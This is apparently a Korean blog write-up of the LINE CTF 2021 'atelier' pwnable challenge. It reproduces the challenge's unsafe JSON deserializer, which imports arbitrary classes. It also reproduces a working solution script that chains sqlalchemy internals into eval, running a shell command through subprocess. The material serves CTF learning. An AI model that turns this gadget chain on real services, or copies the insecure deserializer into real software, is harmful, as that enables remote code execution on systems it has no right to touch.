---
title: LineCTF 2021 - atelier
categories:
 - pwnable
tags: python, eval
---

- Introduction
- slv.py
- 느낀 점          
- Reference

# Introduction

저번 주 토요일에 참여했던 LINE CTF 2021에서 pwnable에서 그나마 다수의 사람들이 풀었길래 나도 한번 건들여 봤다가 피를 봤던 문제였다. 진짜 진짜 진짜 어떻게 별의 별 생각을 다했다.

서버의 코드를 예측을 해야되는건가.. 블라인드를 해야되는건가.. 어떻게 쉘 명령어를 실행시키냐..

이 생각 하다가 도저히 못 풀겠어서 롸업을 기다리다가 오늘 나와서 진짜 어이 없어서 리뷰를 하려고 한다.

# slv.py

`client.py` 문제에서 주어진 소스코드이다.

```python
import sys
import json
import asyncio
import importlib

# from sqlalchemy import *

class AtelierException:
    def __init__(self, e):
        self.message = repr(e)

class MaterialRequest:
    pass

class MaterialRequestReply:
    pass

class RecipeCreateRequest:
    def __init__(self, materials):
        self.materials = materials

class RecipeCreateReply:
    pass

def object_to_dict(c):
    res = {}
    res["__class__"] = str(c.__class__.__name__)
    res["__module__"] = str(c.__module__)
    res.update(c.__dict__)
    return res

def dict_to_object(d):
    if "__class__" in d:
        class_name = d.pop("__class__")
        module_name = d.pop("__module__")
        module = importlib.import_module(module_name)
        class_ = getattr(module, class_name)

        inst = class_.__new__(class_)
        inst.__dict__.update(d)
    else:
        inst = d

    return inst

async def rpc_client(message):
    message = json.dumps(message, default=object_to_dict)

    reader, writer = await asyncio.open_connection(sys.argv[1], int(sys.argv[2]))
    writer.write(message.encode())
    data = await reader.read(2000)
    writer.close()

    res = json.loads(data, object_hook=dict_to_object)
    if isinstance(res, AtelierException):
        print("Exception: " + res.message)
        exit(1)

    return res
```

`solution.py` (밑의 reference에서 올려준 롸업이다.)

```python
# found these classes by grepping sqlalchemy source code
# https://github.com/sqlalchemy/sqlalchemy/blob/rel_1_3_5/lib/sqlalchemy/ext/declarative/clsregistry.py#L292
from sqlalchemy.ext.declarative.clsregistry import _class_resolver
# https://github.com/sqlalchemy/sqlalchemy/blob/rel_1_3_5/lib/sqlalchemy/sql/functions.py#L486
# we need it to use split(","), to strip the argument
from sqlalchemy.sql.functions import _FunctionGenerator

target = _class_resolver.__new__(_class_resolver)
target.arg = """exec('import subprocess; raise Exception(subprocess.check_output("cat flag", shell=True))')"""
target._dict = {}

obj = RecipeCreateRequest.__new__(RecipeCreateRequest)
obj.materials = RecipeCreateRequest.__new__(RecipeCreateRequest)
obj.materials.split = _FunctionGenerator.__new__(_FunctionGenerator)
obj.materials.split.opts = RecipeCreateRequest.__new__(RecipeCreateRequest)
obj.materials.split.opts.copy = target
serialized = json.dumps(obj, default=object_to_dict, indent=4)
print(serialized)

deserialized = json.loads(serialized, object_hook=dict_to_object)
deserialized.materials.split(",")
# flag is in the exception message
# thanks to kanak from discord for his payload
# during ctf I haven't realized that I can nest classes
```

솔직히 말하면 solution 소스코드 말고 다른 부연설명이 없어서 틀린 내용이 있을 수 있다.

```
/usr/local/lib/python3.7/dist-packages/sqlalchemy/sql/functions.py in __call__(self, *c, **kwargs)
    485 
    486     def __call__(self, *c, **kwargs):
--> 487         o = self.opts.copy()
    488         o.update(kwargs)
    489 

/usr/local/lib/python3.7/dist-packages/sqlalchemy/ext/declarative/clsregistry.py in __call__(self)
    292     def __call__(self):
    293         try:
--> 294             x = eval(self.arg, globals(), self._dict)
    295 
    296             if isinstance(x, _GetColumns):
```

그러니까 `sqlalchemy` 모듈의 인터널을 이용해서 푸는데, 서버로 보내는 serialize된 obj의 맴버인 materials의 `split.opts.copy`를 필요한 클래스의 인스턴스로 형성해준다.

(여기서부터 제 뇌피셜입니다.)
해당 materials는 서버로 전송되면 split을 호출해서 ','을 기준으로 나눠서 클라이언트에서 요청한 문양 및 색을 리턴해주는데 이때 materials.split을 `_FunctionGenerator`의 인스턴스로 만들어 버리면 위의 functions.py에서도 볼 수 있다시피 `__call__`함수에서 self.opts.copy()를 호출하게 된다.

여기서 `self`는 obj.materials.split이니까 obj.materials.split.opts.copy를 eval함수를 호출하는 `_class_resolver`클래스의 인스턴스로 만들고 arg에 flag를 호출하는 코드를 넣은것 같다.

그래서 해당 문제의 솔루션은 

`obj.material.split`을 `_FunctionGenerator`의 인스턴스로 만들고 `obj.material.split.opts.copy`에는 `_class_resolver`의 인스턴스를 넣어줘서 문제를 푼것이다.
`obj.material`, `obj.material.split.opts`는 아무 인스턴스나 넣으면 되서 클라이언트 코드에 있는 `RecipeCreateRequest`를 넣어준것 같다. (뇌피셜)


틀린 점이 있다면 메일 부탁드립니다!(kws981924@gmail.com)

# 느낀 점

개강하니까 진짜 힘들다 힘내자..

# Reference

[https://colab.research.google.com/drive/1Eg7dwu6bProy4Pwwgqg0UG0bj3NjGLOD#scrollTo=FIgw_-i_13U3](https://colab.research.google.com/drive/1Eg7dwu6bProy4Pwwgqg0UG0bj3NjGLOD#scrollTo=FIgw_-i_13U3)
